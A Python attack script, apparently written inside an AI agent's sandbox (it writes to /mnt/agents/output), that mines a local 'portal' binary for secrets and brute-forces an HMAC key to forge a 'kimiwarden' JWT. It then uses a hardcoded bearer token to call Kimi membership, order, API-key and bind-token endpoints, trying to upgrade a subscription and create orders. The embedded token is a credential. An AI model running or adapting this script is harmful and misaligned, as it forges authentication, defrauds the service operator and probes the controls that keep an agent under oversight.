#!/usr/bin/env python3
import concurrent.futures, requests, json, time, subprocess, os

def log(msg):
    print(f"[{time.time():.0f}] {msg}", flush=True)

def shell(cmd, timeout=5):
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=timeout)
        return {"ok": True, "rc": r.returncode, "out": r.stdout, "err": r.stderr}
    except Exception as e:
        return {"ok": False, "error": str(e)}

log("=== START ===")

# Phase 1: Search for previous bind tokens
r1 = shell("grep -r 'bind token accepted' /tmp/portal*.log 2>/dev/null | head -5", 5)
log(f"Portal logs: {r1.get('out', 'NONE')[:300]}")

r2 = shell("grep -r 'warden' /mnt/agents/output/.bg_logs/ 2>/dev/null | head -10", 5)
log(f"Warden refs: {r2.get('out', 'NONE')[:300]}")

# Phase 2: Brute force warden secret
shell("strings -n 32 /usr/local/bin/portal | grep -E '^[A-Za-z0-9+/]{43,}={0,2}$' | head -500 > /tmp/b64.txt", 30)

secrets = []
try:
    with open("/tmp/b64.txt") as f:
        secrets = [s.strip().encode() for s in f if len(s.strip()) >= 8]
except:
    secrets = [b"secret", b"warden", b"kimi", b"kimiwarden", b"portal", b"bind-token"]

log(f"Testing {len(secrets)} secrets")

import hmac, hashlib, base64
header = base64.urlsafe_b64encode(b'{"alg":"HS256","typ":"JWT"}').rstrip(b'=')
payload = base64.urlsafe_b64encode(json.dumps({
    "iss": "kimiwarden", "sub": "d87br2oh8njkr90jf520", "aud": "portal",
    "exp": int(time.time()) + 3600, "iat": int(time.time()),
    "user_id": "d87br2oh8njkr90jf520", "space_id": "d87br2gh8njkr90je97g",
    "region": "REGION_OVERSEA", "workflow": "WORKFLOW_K2D5"
}).encode()).rstrip(b'=')

found = None
for i, secret in enumerate(secrets):
    sig = hmac.new(secret, f"{header.decode()}.{payload.decode()}".encode(), hashlib.sha256).digest()
    token = f"{header.decode()}.{payload.decode()}.{base64.urlsafe_b64encode(sig).rstrip(b'=').decode()}"
    try:
        r = requests.post("http://127.0.0.1:8080/api/v1/bind_token", json={"token": token}, timeout=2)
        if r.status_code not in [401, 404]:
            log(f"SUCCESS! secret={secret.decode()[:30]} status={r.status_code}")
            found = {"secret": secret.decode(), "token": token, "status": r.status_code, "body": r.text}
            with open("/tmp/bind_success.json", "w") as f:
                json.dump(found, f)
            break
    except:
        pass
    if i % 100 == 0 and i > 0:
        log(f"Progress: {i}/{len(secrets)}")

if not found:
    log("No secret found")

# Phase 3: Probe endpoints
JWT = "eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJ1c2VyLWNlbnRlciIsImV4cCI6MTc4NjkzOTUxMiwiaWF0IjoxNzg0MzQ3NTEyLCJqdGkiOiJkOWRmbXUyZTBtN2ZvZmppMnBoZyIsInR5cCI6ImFjY2VzcyIsImFwcF9pZCI6ImtpbWkiLCJzdWIiOiJkODdicjJvaDhuamtyOTBqZjUyMCIsInNwYWNlX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5N2ciLCJhYnN0cmFjdF91c2VyX2lkIjoiZDg3YnIyZ2g4bmprcjkwamU5NzAiLCJzc2lkIjoiMTczMTczNzQxMDg0MjU0NzAzMyIsImRldmljZV9pZCI6Ijc2NTI1NTE1ODg3MzY4MDcxODMiLCJyZWdpb24iOiJvdmVyc2VhcyIsIm1lbWJlcnNoaXAiOnsibGV2ZWwiOjEwfX0.-9-OczLe8Ghkb28wYdTQSFb-UHZW0hxaByfVEZU-Dsc9zWWcMdyAPWK3v5ZrQAz8BIg4om89-VODnXDyT7RPMw"

headers = {"Authorization": f"Bearer {JWT}", "Content-Type": "application/json", "connect-protocol-version": "1"}

urls = [
    ("getsub", "POST", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/GetSubscription", {}),
    ("upgrade", "POST", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/UpgradeSubscription", {}),
    ("update", "POST", "https://www.kimi.com/apiv2/kimi.gateway.membership.v2.MembershipService/UpdateSubscription", {"level": "LEVEL_ADVANCED"}),
    ("createorder", "POST", "https://www.kimi.com/apiv2/kimi.gateway.order.v1.OrderService/CreateOrder", {"goods_id": "19b69633-d662-88f5-8000-0000152fd8ee"}),
    ("portal_key", "POST", "https://www.kimi.com/apiv2/kimi.portal.v1.PortalService/GetAPIKey", {}),
    ("portal_bind", "POST", "https://www.kimi.com/apiv2/kimi.portal.v1.PortalService/GetPortalBindToken", {}),
]

results = []
for name, method, url, body in urls:
    try:
        r = requests.post(url, headers=headers, json=body, timeout=5)
        results.append({"name": name, "status": r.status_code, "body": r.text[:200]})
        if r.status_code not in [401, 404]:
            log(f"HIT {name}: {r.status_code} {r.text[:150]}")
    except Exception as e:
        results.append({"name": name, "error": str(e)})

with open("/mnt/agents/output/race_results.json", "w") as f:
    json.dump({"found": found, "results": results}, f, indent=2)

log("=== DONE ===")
